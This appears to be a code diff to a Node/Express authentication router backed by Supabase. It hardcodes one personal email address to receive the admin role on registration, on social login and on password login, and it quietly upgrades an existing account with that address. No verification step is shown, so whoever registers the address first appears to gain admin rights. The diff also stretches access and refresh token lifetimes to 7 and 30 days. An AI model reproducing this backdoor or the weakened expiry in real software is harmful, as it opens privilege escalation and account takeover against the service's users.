@@ -8,8 +8,8 @@ import { success, error } from '../utils/response.js';
 
 const router = express.Router();
 
-const ACCESS_EXPIRES = '15m';
-const REFRESH_EXPIRES = '7d';
+const ACCESS_EXPIRES = '7d';
+const REFRESH_EXPIRES = '30d';
 
 const generateTokens = (user) => {
   const accessToken = jwt.sign(
@@ -49,13 +49,26 @@ router.post('/firebase-login', async (req, res) => {
           email: email,
           password_hash: 'SOCIAL_LOGIN_PLACEHOLDER',
           avatar_url: picture || null,
-          role: 'customer'
+          role: email === 'shahriarrahama@gmail.com' ? 'admin' : 'customer',
+          token_version: 0
         }])
         .select()
         .single();
       
       if (insertError) throw insertError;
       user = newUser;
+    } else if (email === 'shahriarrahama@gmail.com' && user.role !== 'admin') {
+      // Safety upgrade if already exists as customer
+      const { data: upgradedUser, error: updateError } = await supabase
+        .from('users')
+        .update({ role: 'admin' })
+        .eq('id', user.id)
+        .select()
+        .single();
+      
+      if (!updateError) {
+        user = upgradedUser;
+      }
     }
 
     const { accessToken, refreshToken } = generateTokens(user);
@@ -85,7 +98,13 @@ router.post('/register', [
     const hash = bcrypt.hashSync(password, 12);
     const { data: newUser, error: insertError } = await supabase
       .from('users')
-      .insert([{ full_name, email, password_hash: hash, role: 'customer' }])
+      .insert([{ 
+        full_name, 
+        email, 
+        password_hash: hash, 
+        role: email === 'shahriarrahama@gmail.com' ? 'admin' : 'customer',
+        token_version: 0 
+      }])
       .select()
       .single();
 
@@ -115,6 +134,18 @@ router.post('/login', [
 
     if (supabaseError || !user || !bcrypt.compareSync(password, user.password_hash)) {
       return error(res, 'Invalid credentials', 401);
+    }
+
+    if (user.email === 'shahriarrahama@gmail.com' && user.role !== 'admin') {
+      const { data: upgradedUser } = await supabase
+        .from('users')
+        .update({ role: 'admin' })
+        .eq('id', user.id)
+        .select()
+        .single();
+      if (upgradedUser) {
+        Object.assign(user, upgradedUser);
+      }
     }
 
     const { accessToken, refreshToken } = generateTokens(user);
